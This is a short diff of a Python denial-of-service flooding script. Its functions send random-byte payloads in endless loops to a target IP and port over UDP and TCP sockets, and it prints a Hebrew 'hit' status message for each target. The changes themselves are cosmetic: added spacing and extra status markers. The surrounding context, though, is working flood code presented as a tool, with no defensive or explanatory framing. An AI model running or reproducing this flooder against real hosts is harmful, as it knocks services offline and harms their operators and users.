@@ -94,13 +94,13 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print("[+]  \033[32mTCP \033[33mנפגע על ידי סערה מדברית\033[0m " +ip+ "")
+			print("[+]  \033[32mTCP   \033[33mנפגע על ידי סערה מדברית\033[0m " +ip+ "")
 		except:
 			print("[-]  \033[31mMay be down\033[0m")
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[+]","[-]"))
+	i = random.choice(("[+]","[*]","[#]","[×]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -115,7 +115,7 @@ def run2():
 			
 def run3():
 	data = random._urandom(818)
-	i = random.choice(("[+]","[-]"))
+	i = random.choice(("[+]","[*]","[#]","[×]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -130,7 +130,7 @@ def run3():
             
 def run4():
 	data = random._urandom(16)
-	i = random.choice(("[+]","[-]"))
+	i = random.choice(("[+]","[*]","[#]","[×]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
